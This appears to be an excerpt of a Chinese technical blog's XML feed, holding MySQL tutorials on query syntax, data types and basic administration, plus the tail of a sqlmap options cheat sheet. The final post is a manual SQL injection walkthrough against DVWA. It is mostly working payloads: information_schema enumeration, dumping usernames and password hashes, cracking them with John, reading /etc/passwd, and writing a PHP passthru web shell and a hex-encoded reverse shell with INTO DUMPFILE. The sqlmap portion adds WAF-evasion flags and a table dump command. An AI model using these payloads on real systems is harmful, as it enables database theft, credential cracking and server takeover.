&quot;ign,flu,bat,tec=U,dump,D=testdb,T=users&quot; -u “1.1.1.1/ vuln.php?id=1&quot;--answer    sqlmap -u &quot;http://1.1.1.1/a.php?id=1&quot; --technique=E --answers=&quot;extending=N&quot; --batch--check-waf        #检测WAF/IPS/IDS--hpp            #HTTP parameter pollution    绕过WAF/IPS/IDS的有效方法    尤其对ASP/IIS和ASP.NET/IIS--identify-waf    #彻底的waf/ips/ids检查    支持30多种产品--mobile        #模拟智能手机设备--purge-output    #清除output文件夹--smart            #当有大量检测目标时,只选择基于错误的检测结果--wizard        #向导</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> Web渗透 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> sqlmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL条件子句及查询语法</title>
      <link href="/2014/05/06/MySQL/MySQL%E6%9D%A1%E4%BB%B6%E5%AD%90%E5%8F%A5%E5%8F%8A%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95/"/>
      <url>/2014/05/06/MySQL/MySQL%E6%9D%A1%E4%BB%B6%E5%AD%90%E5%8F%A5%E5%8F%8A%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<ul><li><strong>字符类型的宽度和数值类型的宽度的区别</strong><ul><li>数值类型的宽度仅仅为显示宽度,只用于select查询显示,和占用的存储空间大小无关,可用zerofill查看效果</li><li>字符类型的宽度超过则无法存储</li></ul></li></ul><h4 id="where条件子句-配合查询-修改-删除操作"><a href="#where条件子句-配合查询-修改-删除操作" class="headerlink" title="where条件子句 (配合查询,修改,删除操作)"></a><strong>where条件子句</strong> (配合查询,修改,删除操作)</h4><p><strong>查询语法</strong><br><code>select * from 表名 where 条件;</code></p><p><strong>表记录管理</strong></p><ul><li>删除表记录<ul><li><code>delete from 表名 where 条件;</code></li><li>注意<ul><li>delete语句后如果不加where条件子句,会将表中所有记录全部删除</li></ul></li></ul></li><li>更新表记录<ul><li><code>update 表名 set 字段名1=值1,字段名2=值2,... where 条件;</code></li></ul></li></ul><h4 id="运算符操作"><a href="#运算符操作" class="headerlink" title="运算符操作"></a><strong>运算符操作</strong></h4><ul><li>数值比较运算符: <code>=,!=,&gt;,&gt;=,&lt;,&lt;=</code></li><li>字符比较运算符: <code>=, !=</code></li></ul><h4 id="逻辑比较"><a href="#逻辑比较" class="headerlink" title="逻辑比较"></a><strong>逻辑比较</strong></h4><ul><li>运算符:<ul><li>and (两个或多个条件同时满足)</li><li>or  (两个或者多个条件有一个满足就可以)</li></ul></li></ul><h4 id="范围内比较"><a href="#范围内比较" class="headerlink" title="范围内比较"></a><strong>范围内比较</strong></h4><ul><li>运算符:<ul><li>between and</li><li>in</li><li>not in </li></ul></li><li>语法:  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">between 值1 and 值2</span><br><span class="line"></span><br><span class="line">in(值1,值2,...值N)</span><br><span class="line"></span><br><span class="line">not in(值1,值2,...,值N)</span><br></pre></td></tr></table></figure></li></ul><h4 id="匹配空和非空"><a href="#匹配空和非空" class="headerlink" title="匹配空和非空"></a><strong>匹配空和非空</strong></h4><ul><li><p>空: <code>is null</code></p></li><li><p>非空: <code>is not null</code></p></li><li><p><strong>注意</strong></p><ul><li>null: 空值,必须用 is 或者 is not 去匹配</li><li>“” : 空字符串,用 = 或者 != 去匹配</li></ul></li></ul><h4 id="模糊比较"><a href="#模糊比较" class="headerlink" title="模糊比较"></a><strong>模糊比较</strong></h4><ul><li><code>select 字段名 from 表名 where 字段名 like 表达式;</code></li><li>表达式<ul><li>_ : 匹配单个字符</li><li>% : 匹配0到多个字符</li></ul></li><li>示例  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select name from sanguo where name like &quot;_%_&quot;;</span><br><span class="line">select name from sanguo where name like &quot;%&quot;;#null值不会被统计</span><br><span class="line">select name from sanguo where name like &quot;___&quot;;</span><br><span class="line">select name from sanguo where name like &quot;张%&quot;;</span><br></pre></td></tr></table></figure></li></ul><h4 id="正则匹配查询-regexp"><a href="#正则匹配查询-regexp" class="headerlink" title="正则匹配查询 regexp"></a><strong>正则匹配查询</strong> regexp</h4><ul><li><p><code>where 字段名 regexp &quot;正则表达式&quot;;</code></p></li><li><p>正则表达式符号</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">^ : 以...开头</span><br><span class="line"></span><br><span class="line">$ : 以...结尾</span><br><span class="line"></span><br><span class="line">. : 匹配任意一个字符</span><br><span class="line"></span><br><span class="line">[]: 包含...内容 </span><br><span class="line">[0-9]: 匹配带数字的</span><br><span class="line">[a-z]: 匹配带小写字母的</span><br><span class="line">[A-Z]: 匹配带大写字母的</span><br><span class="line"></span><br><span class="line">* : 星号前面的字符出现0次或多次&quot;^张.*&quot;</span><br></pre></td></tr></table></figure></li><li><p>示例</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select name from sanguo where name regexp &quot;[0-9]&quot;;#匹配带数字的</span><br><span class="line">select name from sanguo where name regexp &quot;^[0-9]&quot;;#匹配名字中以数字开头的记录</span><br><span class="line">select name from sanguo where name regexp &quot;[0-9]$&quot;;#匹配名字中以数字结尾的记录</span><br><span class="line">select name from sanguo where name regexp &quot;^司.*懿$&quot;;#匹配以司开头以懿结尾中间可以是任意字符</span><br><span class="line">select name from sanguo where name regexp &quot;^...$&quot;;#....</span><br></pre></td></tr></table></figure></li></ul><h4 id="SQL查询"><a href="#SQL查询" class="headerlink" title="SQL查询"></a><strong>SQL查询</strong></h4><ul><li><p>总结(执行顺序)</p><ol start="3"><li>select … 聚合函数 from 表名</li><li>where …</li><li>group by …</li><li>having …</li><li>order by …</li><li>limit …</li></ol></li><li><p><strong>order by</strong></p><ul><li>作用: 给查询的结果进行排序</li><li>语法格式: <code>order by 字段名 排序方式;</code></li><li>排序方式<ul><li>ASC(默认): 升序</li><li>DESC: 降序<ul><li>select * from sanguo order by fangyu asc;</li></ul></li></ul></li></ul></li><li><p><strong>limit</strong> (永远放在SQL语句的最后写)</p><ul><li>作用: 限制显示查询记录的个数</li><li>用法:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">limit n#显示n条记录</span><br><span class="line">limit m,n#从第(m+1)条开始,显示N条记录</span><br><span class="line">limit 4,5#显示5到10.</span><br><span class="line"># m的值是从0开始计数的</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>聚合函数</strong></p><ul><li>分类<ul><li>avg(字段名) : 求字段的平均值</li><li>sum(字段名) : 求和</li><li>max(字段名) : 求最大值</li><li>mix(字段名) : 求最小值</li><li>count(字段名) : 统计该字段记录的个数<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select max(gongji) as best from sanguo;</span><br><span class="line">select count(id),count(name) from sanguo;</span><br><span class="line"># 空值NULL不会被统计,空字符串&quot;&quot;会被统计</span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><p><strong>group by</strong> (先分组再聚合)</p><ul><li>作用: 给查询的结果进行分组</li><li>示例<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select country from sanguo group by country;</span><br><span class="line">select country,avg(gongji) from sanguo group by country;</span><br><span class="line">select country,count(*) as numbers from sanguo group by country order by numbers desc limit 2;</span><br></pre></td></tr></table></figure></li><li>执行过程:<ul><li>先分组(此时未去重) <code>group by country</code></li><li>再聚合(求每组的平均攻击值)</li><li>去重</li></ul></li><li>注意<ul><li>group by之后的字段名必须要为select之后的字段名</li><li>如果select之后的字段没有在group by语句之后,则必须要对该字段进行聚合函数处理</li></ul></li></ul></li><li><p><strong>having</strong></p><ul><li>作用 : 对查询的结果进行进一步筛选</li><li>示例<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select country,avg(gongji) as pjgj from sanguo group by country having pjgj &gt; 105 order by pjgj desc limit 2;</span><br></pre></td></tr></table></figure></li><li>注意<ul><li>having语句通常与group by语句联合使用,用来过滤由group by语句返回的记录集</li><li>having语句的存在弥补了where条件子句不能与聚合函数联合使用的不足,where操作的是表中实际存在的字段,having操作的是聚合函数生成的显示列</li></ul></li></ul></li><li><p><strong>distinct</strong></p><ul><li>作用: 去重,不显示字段的重复值<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select distinct name,country from sanguo;</span><br><span class="line">select count(distinct name) from sanguo where country &#x3D; &quot;蜀国&quot;;</span><br></pre></td></tr></table></figure></li><li>注意<ul><li>distinct处理的是distinct和from之间的所有字段,所有字段值必须完全相同才可以去重</li><li>distinct不能对任何字段做聚合处理</li></ul></li></ul></li><li><p><strong>查询表记录时可以做数学运算</strong></p><ul><li>运算符<br>  <code>+ - * / %</code></li><li>示例<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select name,gongji*10,country from sanguo;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>约束</strong></p><ul><li>作用<ul><li>为了保证数据的完整性,一致性,有效性,可以限制无效的数据插入到数据表中</li></ul></li><li>约束分类<ul><li>默认约束(default)<ul><li>作用<ul><li>在插入记录时,如果不给该字段赋值,则使用默认值</li></ul></li><li>格式<ul><li><code>字段名 数据类型 default 默认值,</code></li></ul></li></ul></li><li>非空约束<ul><li>作用<ul><li>不允许该字段的值有空值NULL记录</li></ul></li><li>格式<ul><li><code>字段名 数据类型 not null,</code></li></ul></li></ul></li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> DBMS </category>
          
          <category> MySQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> SQL查询 </tag>
            
            <tag> regexp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL数据类型</title>
      <link href="/2014/05/05/MySQL/MySQL%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
      <url>/2014/05/05/MySQL/MySQL%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<blockquote><h4 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a><strong>数据类型</strong></h4></blockquote><ol><li><p><strong>数值类型</strong> (有符号signed和无符号unsigned)</p><ul><li><p>整型</p><ul><li><p>int 大整型(4个字节)<br>  取值范围: <code>0 - 2 ** 32 -1</code> (约42亿+)</p></li><li><p>tinyint 微小整型(1个字节) </p><ul><li>有符号(signed默认): -128-127</li><li>无符号(unsigned):0-255</li></ul></li><li><p>smallint 小整型(2个字节)<br>  取值范围: 0 -65535</p></li><li><p>bigint 极大整型(8个字节)<br>  取值范围: <code>0 - 2 ** 64 - 1</code></p></li></ul></li><li><p>浮点型</p><ul><li><p>float (4个字节,最多显示7个有效位)<br>  <strong>用法</strong>:<br>  字段名 float(m,n) m:表示总位数 n:小数位位数<br>  salary float(5,2) 取值范围? -999.99 ~ 999.99</p></li><li><p>double(8个字节,最多显示15个有效位)<br>  <strong>用法</strong><br>  字段名 double(m,n)</p></li><li><p>decimal(M+2个字节,最多显示28个有效位)<br>  <strong>用法</strong><br>  decimal(28,5)</p></li></ul></li></ul></li><li><p><strong>字符类型</strong></p><ul><li><p>char(定长)</p><ul><li>取值范围: 1-255</li><li>不给定宽度默认为 1</li></ul></li><li><p>varchar(变长)</p><ul><li>取值范围: 1-65535</li><li>注意<br>  varchar没有默认宽度,必须给定一个宽度值<br>  name varchar(20)</li></ul></li><li><p>char 和 varchar 的特点</p><ul><li>char<br>  浪费存储空间,但是性能高</li><li>varchar<br>  节省存储空间,但是性能低</li></ul></li></ul></li><li><p><strong>枚举类型</strong></p><ul><li><p>定义</p><ul><li>字段值只能在列举的范围内选择</li></ul></li><li><p>enum(…) 单选(最多有65535个不同的值)</p><ul><li>字段名(值1,值2,…,值N)</li></ul></li><li><p>set(…) 多选(最多有64个不同的值)</p><ul><li>字段名 set(值1,值2,…,值N)</li></ul></li></ul></li><li><p><strong>日期时间类型</strong></p><ul><li><p>year : 年 YYYY</p></li><li><p>data : 日期 YYYYMMDD</p></li><li><p>time : 时间 HHMMSS</p></li><li><p>datatime : 日期时间 YYYYMMDDHHMMSS</p></li><li><p>timestamp : 日期实践 YYYYMMDDHHMMSS</p></li><li><p>创建t6表</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [owl]&gt; create table t6(</span><br><span class="line">-&gt; id int,</span><br><span class="line">-&gt; name varchar(15),</span><br><span class="line">-&gt; age tinyint unsigned,</span><br><span class="line">-&gt; birth_year year,</span><br><span class="line">-&gt; birthday date,</span><br><span class="line">-&gt; class time,</span><br><span class="line">-&gt; meeting datetime</span><br><span class="line">-&gt; )default charset&#x3D;utf8;</span><br><span class="line">Query OK, 0 rows affected (0.004 sec)</span><br></pre></td></tr></table></figure></li><li><p>插入数据</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [owl]&gt; insert into t6 values</span><br><span class="line">-&gt; (1,&quot;小宝宝&quot;,40,1979,19790520,090000,20170504000000);</span><br><span class="line">Query OK, 1 row affected (0.002 sec)</span><br></pre></td></tr></table></figure></li><li><p>注意</p><ul><li>插入记录时tatetime字段不给值默认返回NULL</li><li>插入记录时timestamp字段不给值默认返回系统当前时间</li></ul></li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> DBMS </category>
          
          <category> MySQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> 数据类型 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL介绍及基本使用</title>
      <link href="/2014/05/04/MySQL/MySQL%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
      <url>/2014/05/04/MySQL/MySQL%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h4 id="名词介绍"><a href="#名词介绍" class="headerlink" title="名词介绍"></a><strong>名词介绍</strong></h4><ul><li>DB(Database)<br>DB就是数据库,存储数据的仓库</li><li>DBMS(Database Management System)<br>数据库管理系统<br>管理数据库的软件:MySQL,Oracle,MongoDB…</li><li>DBS(Database System)<br>数据库系统<br>DBS = DB(存储) + DBMS(数据库管理软件) + 数据库应用(财务管理系统,人事管理系统) + 用户</li></ul><h4 id="MySQL的特点"><a href="#MySQL的特点" class="headerlink" title="MySQL的特点"></a><strong>MySQL的特点</strong></h4><blockquote><p><strong>关系型数据库</strong></p></blockquote><ol><li>关系型数据库的特点</li></ol><ul><li>数据是以行和列的形式去存储的</li><li>这一系列的行和列称为表</li><li>表中的每一行叫一条纪录</li><li>表中的每一列叫一个字段</li><li>表和表之间的逻辑关联叫关系</li></ul><p><strong>Example:</strong></p><ol><li><p>关系型数据库存储<br> 学生信息表:<br> 姓名    年龄    班级<br> cat        22        AID1803<br> owl        23        AID1801<br> 班级信息表:<br> 班级    班主任<br> AID1803        小可爱<br> AID1801        大可爱</p></li><li><p>非关系型数据库中存储<br> {“姓名”:”cat”,”年龄”:22,”班级”:”AID1803”,”班主任”:”小可爱”}<br> {“姓名”:”owl”,”年龄”:25,”班级”:”AID1803”,”班主任”:”小可爱”}</p></li></ol><h4 id="MySQL安装"><a href="#MySQL安装" class="headerlink" title="MySQL安装"></a><strong>MySQL安装</strong></h4><ul><li>Ubuntu安装MySQL服务    RedHat(红帽),CentOS,Ubuntu</li></ul><ol><li><p>安装服务端</p><p> <code>sudo apt-get install mysql-server</code></p></li><li><p>安装客户端</p><p> <code>sudo apt-get install mysql-client</code></p></li></ol><ul><li>Windows安装MySQL安装包(Winodws)</li></ul><h4 id="启动和连接MySQL服务"><a href="#启动和连接MySQL服务" class="headerlink" title="启动和连接MySQL服务"></a><strong>启动和连接MySQL服务</strong></h4><p><strong>服务端启动</strong></p><ol><li>查看MySQL服务状态</li></ol><pre><code>sudo /etc/init.d/mysql status</code></pre><ol start="2"><li>停止,启动,重启MySQL服务</li></ol><pre><code>sudo /etc/init.d/mysql stop        #停止service mysql stopsudo /etc/init.d/mysql start    #启动service mysql startsudo /etc/init.d/mysql restart    #重启service mysql restart</code></pre><p><strong>客户端连接</strong></p><ol><li>命令格式</li></ol><pre><code>mysql -h主机地址 -u用户名 -p密码mysql -hlocalhost -uroot -p123456</code></pre><ol start="2"><li>本地连接可以省略 -h 选项</li></ol><pre><code>mysql -u用户名 -p密码mysql -uroot -p123456</code></pre><h4 id="基本MySQL命令"><a href="#基本MySQL命令" class="headerlink" title="基本MySQL命令"></a><strong>基本MySQL命令</strong></h4><ul><li>SQL命令的使用规则<ol><li>每条SQL命令必须以 <code>;</code> 结尾</li><li>SQL命令不区分字母大小写</li><li>使用 \c 来终止命令的执行(Linux中 ctrl+c)</li></ol></li></ul><h5 id="库的管理"><a href="#库的管理" class="headerlink" title="库的管理"></a><strong>库的管理</strong></h5><ul><li><p>库的基本操作</p><ol><li><p>查看已有的库</p><p> <code>show databases;</code></p></li><li><p>创建库(指定默认字符集)</p><p> <code>create database 库名 default charset=utf8;</code></p></li><li><p>查看创建库的语句</p><p> <code>show create database 库名;</code></p></li><li><p>查看当前所在库</p><p> <code>select database();</code></p></li><li><p>切换库</p><p> <code>use 库名;</code></p></li><li><p>查看库中已有表</p><p> <code>show tables;</code></p></li><li><p>删除库</p><p> <code>drop database 库名；</code></p></li></ol></li><li><p>库名的命名规则</p></li><li><p>可以使用数字,字母,_,但不能使用纯数字</p></li><li><p>库名区分字母大小写</p></li><li><p>库名具有唯一性</p></li><li><p>不能使用特殊字符和MySQL关键字</p></li></ul><h5 id="表的管理"><a href="#表的管理" class="headerlink" title="表的管理"></a><strong>表的管理</strong></h5><ul><li><p>表的基本操作</p><ol><li><p>创建表(指定字符集)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">create table 表名(</span><br><span class="line">字段名 数据类型,</span><br><span class="line">字段名 数据类型,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">create table t1(</span><br><span class="line">name char(20),</span><br><span class="line">age int,</span><br><span class="line">score int</span><br><span class="line">)default charset &#x3D; utf8;</span><br><span class="line"></span><br><span class="line">show tables;</span><br></pre></td></tr></table></figure></li><li><p>查看创建表的语句(字符集)</p><p> <code>show create table 表名;</code></p></li><li><p>查看表结构</p><p> <code>desc 表名;</code></p></li><li><p>删除表</p><p> <code>drop table 表名;</code></p></li></ol></li><li><p>表的命名规则(同库的命名规则)</p></li></ul><p><strong>注意</strong></p><ol><li>所有的数据都是以文件的形式存放在数据库目录下</li><li>数据库目录: /var/lib/mysql</li></ol><p><strong>更改库,表的默认字符集</strong></p><ol><li>方法<br>通过更改MySQL服务的配置文件来实现</li><li>步骤 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sudo -i#获取root权限</span><br><span class="line">cd &#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d#切换到配置文件所在路径</span><br><span class="line">cp -p mysql.cnf mysqld.cnf.bak#复制原配置文件和权限备份</span><br><span class="line">vi mysqld.cnf</span><br><span class="line">&#x2F;[mysqld]</span><br><span class="line">character_set_server &#x3D; utf8 #保存退出</span><br><span class="line">&#x2F;etc&#x2F;init.d&#x2F;mysql restart#重启mysql服务</span><br><span class="line">&#x2F;etc&#x2F;init.d&#x2F;mysql reload#重载配置文件,不重启</span><br><span class="line"></span><br><span class="line">#登录到MySQL验证</span><br><span class="line">mysql -uroot -p</span><br><span class="line">create database blackcat;</span><br><span class="line">show create database blackcat;</span><br></pre></td></tr></table></figure></li></ol><h5 id="表记录管理"><a href="#表记录管理" class="headerlink" title="表记录管理"></a><strong>表记录管理</strong></h5><ol><li>在表中插入纪录 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">insert into 表名 values(值1),(值2),...,(值N);</span><br><span class="line">insert into t1 values(&quot;Tom&quot;,22,100);</span><br><span class="line">insert into t1 values(&quot;Green&quot;,25,88),(&quot;Lucy&quot;,23,99);</span><br><span class="line">insert into t1(name,age) values(&quot;Jim&quot;,28);</span><br></pre></td></tr></table></figure></li><li>查询表纪录 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from t1;</span><br><span class="line">select 字段1,字段2,..字段名N from 表名;</span><br><span class="line">select name,score from t1;</span><br></pre></td></tr></table></figure></li></ol><h4 id="表字段的操作"><a href="#表字段的操作" class="headerlink" title="表字段的操作"></a><strong>表字段的操作</strong></h4><ol><li><p>语法: alter table 表名 执行动作;</p><ul><li><p>添加字段<br>  <code>alter table 表名 add 字段名 数据类型 first | after 字段名;</code></p></li><li><p>删除字段<br>  <code>alter table 表名 drop 字段名;</code></p></li><li><p>修改字段数据类型<br>  <code>alter table 表名 modify 字段名 新数据类型;</code></p><ul><li>修改数据类型时会受到表中原有数据的限制</li></ul></li><li><p>修改字段名<br>  <code>alter table 表名 change 旧名 新名 数据类型;</code></p></li><li><p>修改表名<br>  <code>alter table 表名 rename 新表名;</code></p></li></ul></li></ol><h4 id="客户端把数据存储到数据库服务器的过程"><a href="#客户端把数据存储到数据库服务器的过程" class="headerlink" title="客户端把数据存储到数据库服务器的过程"></a><strong>客户端把数据存储到数据库服务器的过程</strong></h4><ol><li>连接到数据库服务器 mysql -uroot -p123456</li><li>选择一个库 <code>use 库名;</code></li><li>创建表或者修改表: <code>create ...</code></li><li>断开与数据库服务器的连接: <code>exit | quit | \q</code></li></ol>]]></content>
      
      
      <categories>
          
          <category> DBMS </category>
          
          <category> MySQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DBS </tag>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>手动SQL注入</title>
      <link href="/2014/05/04/Web_Attacks/SQL_Injection/SQL%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5/"/>
      <url>/2014/05/04/Web_Attacks/SQL_Injection/SQL%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="手动漏洞挖掘–SQL注入"><a href="#手动漏洞挖掘–SQL注入" class="headerlink" title="手动漏洞挖掘–SQL注入"></a><strong>手动漏洞挖掘–SQL注入</strong></h3></blockquote><ul><li>服务器端程序将用户输入参数作为查询条件,直接拼接SQL语句,并将查询结果返回给客户端浏览器</li></ul><h5 id="用户登录判断"><a href="#用户登录判断" class="headerlink" title="用户登录判断"></a><strong>用户登录判断</strong></h5><pre><code>SELECT * FROM users WHERE user=&apos;uname&apos; AND password=&apos;pass&apos; SELECT * FROM users WHERE user=&apos;name&apos; AND password=&quot; OR &quot;=&apos;&apos; </code></pre><h5 id="基于报错的检测方法-low"><a href="#基于报错的检测方法-low" class="headerlink" title="基于报错的检测方法(low)"></a><strong>基于报错的检测方法(low)</strong></h5><pre><code>&apos; &apos;&apos; % ()</code></pre><h5 id="基于布尔的检测"><a href="#基于布尔的检测" class="headerlink" title="基于布尔的检测"></a><strong>基于布尔的检测</strong></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and &#39;1&#39;&#x3D;1&#39;&#x2F;1&#39; and &#39;1</span><br><span class="line">1&#39; and &#39;1&#39;&#x3D;&#39;2&#x2F;1&#39; and &#39;0</span><br><span class="line">表列数&#x2F;显示信息位于哪一列</span><br><span class="line">&#39; order by 9-- +#按查询列号排序(注释符:--)</span><br><span class="line">select *#时表字段数&#x3D;查询字段数\</span><br></pre></td></tr></table></figure><h5 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a><strong>联合查询</strong></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#39; union select 1,2-- +</span><br><span class="line">&#39; union all select database(),2-- +</span><br><span class="line">&#39; union select database(),substring_index(USER(),&quot;@&quot;,1)-- </span><br><span class="line">DB用户:user()</span><br><span class="line">DB版本:version()</span><br><span class="line">全局函数:@@datadir, @@hostname, @@VERSION, @@version_compile_os</span><br><span class="line">当前库:database()</span><br><span class="line">ASCLL转字符:CHAR()</span><br><span class="line">连接字符串:CONCAT_WS(CHAR(32,58,32),user(),database(),version())</span><br><span class="line">计算哈希:md5()</span><br><span class="line">Mysql数据结构</span><br><span class="line">information_schema</span><br><span class="line"></span><br><span class="line">所有库所有表&#x2F;统计每库中表的数量</span><br><span class="line">&#39; union select table_name,table_schema from information_schema.tables--+#查询所有库和表</span><br><span class="line">&#39; UNION select table_schema,count(*) FROM information_Schema.tables group by table_schema --+#查询所有库并统计表的数量</span><br><span class="line"> DVWA库中的表名</span><br><span class="line">&#39; union select table_name,table_schema from information_schema.tables where table_schema&#x3D;&#39;dvwa&#39;--+#查询DVWA库中的表名</span><br><span class="line">users表中的所有列(user_id,first_name,first_name,last_name,user,password,avatar)</span><br><span class="line">&#39; union select table_name,column_name from information_schema.columns where table_schema&#x3D;&#39;dvwa&#39; and table_name&#x3D;&#39;users&#39;--+#查询表名中的列</span><br><span class="line">查询user,password列的内容</span><br><span class="line">&#39; union select user,password from dvwa.users--+</span><br><span class="line">&#39; union select user,password from users--+</span><br><span class="line">&#39; union select null, concat(user,0x3a,password) from users--+</span><br></pre></td></tr></table></figure><p><strong>密码破解</strong></p><pre><code>username:passhash------&gt;dvwa.txtjohn --format=raw-MD5 dvwa.txt</code></pre><h4 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a><strong>读取文件</strong></h4><pre><code>&apos; union SELECT null, load_file(&apos;/etc/passwd&apos;)--+</code></pre><h4 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a><strong>写入文件</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#39; union select null,&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot; INTO DUMPFILE &quot;&#x2F;var&#x2F; www&#x2F;a.php&quot; --+</span><br><span class="line">Mysql账号</span><br><span class="line">cat php-revers-shell.php | xxd -ps | tr -d &#39;\n&#39;#查看文件二进制数据并输出16进制数据,删除换行</span><br><span class="line">cat php-revers-shell.php | xxd -ps | tr -d &#39;\n&#39;</span><br><span class="line">&#39; union select null, (0x3c3f706870) INTO DUMPFILE &#39;&#x2F;tmp&#x2F;x.php&#39;-- #通过16进制数据在缓存文件夹写入shell</span><br></pre></td></tr></table></figure><h4 id="保存下载数据库"><a href="#保存下载数据库" class="headerlink" title="保存下载数据库"></a><strong>保存下载数据库</strong></h4><pre><code>&apos; union select null, concat(user,0x3a,password) from users INTO OUTFILE &apos;/ tmp/a.db&apos;-- 